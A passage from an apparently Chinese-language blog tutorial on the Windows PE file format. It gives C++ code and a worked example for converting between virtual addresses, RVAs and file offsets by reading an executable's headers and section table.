class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER *dos,_IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew+<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);        </span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\N1.exe&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic) &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**) <span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&lt; nt-&gt;FileHeader.NumberOfSections)&#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER)*cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(<span class="number">0x4198B0</span>,dos, nt, sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到各个区块以及FOA RVA的值</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014143505239.png" alt="image-20211014143505239"></p>
<h3 id="FOA转VA转换流程"><a href="#FOA转VA转换流程" class="headerlink" title="FOA转VA转换流程"></a>FOA转VA转换流程</h3><p>首先，拿到FOA偏移量:0x25A30</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014150205947.png" alt="image-20211014150205947"></p>
<p>1.判断FOA是否在PE文件头之中</p>
<ul>
<li>如果在PE文件头内 FOA =RVA </li>
<li>如果不在： 判断FOA位于哪个节，差值 = FOA - 节.PointerToRawData(R Offset) , RVA = 差值 + 节.VirtualAddress(RVA) </li>
</ul>
<p>2.VA = ImageBase + RVA</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014145843204.png" alt="image-20211014145843204"></p>
<h3 id="根据流程进行转换"><a href="#根据流程进行转换" class="headerlink" title="根据流程进行转换"></a>根据流程进行转换</h3><p><strong>1.判断FOA是否在文件头内</strong></p>
<p>根据e_ifanew找到PE头，发现相距甚远</p>
<p><strong>2.判断处于哪一区块</strong></p>
<p>FOA&gt;=节.PointerToRawData</p>
<p>FOA&lt;节.PointerToRawData + 当前节<strong>文件对齐</strong>后的大小=节.PointerToRawData+节.SizeOfRawData</p>
<p>翻译一下就是在哪份区块之中</p>
<p><strong>另外，利用FOA求VA时，由于是查找FOA在哪个区块中，因此要利用PointerToRawData（R Size）与 PointerToRawSize（R size)进行判断，而不是VirstualAddress(V Addr) 与 VirstualSize（V Size) 利用VA求FOA时则相反</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014150609609.png" alt="image-20211014150609609"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014151529385.png" alt="image-20211014151529385"></p>
<p>比较可知，根据FOA = 0x25A30可知，FOA在.idata区块之中</p>
<p>差值 = FOR - 节.PointerToRawData = 0x25A30 - 0x25000 = 0xA30</p>
<p>RVA = 节.VirstualAddress  + 差值 = 0x25000 + 0xA30 = 0x25A30</p>
<p><strong>VA = ImageBase + RVA = 0x400000 + 0x25A30 = 0x425A30</strong> </p>
<p>运行程序检验，发现完全吻合！</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014151728378.png" alt="image-20211014151728378"></p>
<h3 id="代码实现FOA-转-VA"><a href="#代码实现FOA-转-VA" class="headerlink" title="代码实现FOA 转 VA"></a>代码实现FOA 转 VA</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize, (UINT)sectionArr[i]-&gt;SizeOfRawData) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment) * nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize, (UINT)sectionArr[i]-&gt;SizeOfRawData) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment) * nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span 